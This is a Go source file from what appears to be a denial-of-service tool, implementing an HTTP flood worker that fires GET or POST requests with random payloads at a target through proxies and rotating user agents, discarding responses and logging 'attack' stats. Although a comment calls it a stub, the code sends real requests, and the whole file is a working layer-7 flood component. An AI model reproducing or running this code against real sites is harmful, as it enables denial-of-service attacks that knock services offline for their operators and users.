package http

import (
	"bytes"
	"context"
	"io"
	"math/rand"
	"net/http"
	"time"

	core "github.com/sammwyy/mikumikubeam/internal/engine"
	"github.com/sammwyy/mikumikubeam/internal/netutil"
)

type floodWorker struct{}

func NewFloodWorker() *floodWorker { return &floodWorker{} }

// Fire: stubbed to simulate a quick non-blocking send; replace with real HTTP request logic
func (w *floodWorker) Fire(ctx context.Context, params core.AttackParams, p core.Proxy, ua string, logCh chan<- core.AttackStats) error {
	// Use pre-parsed target node for L7 URL
	u := params.TargetNode.ToURL()
	target := u.String()
	// Build client per fire to pick proxy/ua; callers may optimize by reusing transports later
	client := netutil.DialedHTTPClient(p, 5*time.Second, 3)
	// random boolean, but favor POST if packetSize > 64
	isGet := params.PacketSize <= 512 && rand.Intn(2) == 0
	payload := randomString(params.PacketSize)
	var req *http.Request
	var err error
	if isGet {
		req, err = http.NewRequestWithContext(ctx, http.MethodGet, target+"/"+payload, nil)
	} else {
		req, err = http.NewRequestWithContext(ctx, http.MethodPost, target, io.NopCloser(bytes.NewBufferString(payload)))
	}
	if err != nil {
		return err
	}
	if ua != "" {
		req.Header.Set("User-Agent", ua)
	}

	// Fire and forget; ignore response body content
	resp, err := client.Do(req)
	if err == nil && resp != nil {
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		// Send log only if request was successful and verbose is enabled
		core.SendAttackLogIfVerbose(logCh, p, params.Target, params.Verbose)
	}
	return nil
}

// randomString utility
func randomString(n int) string {
	if n <= 0 {
		return ""
	}
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}
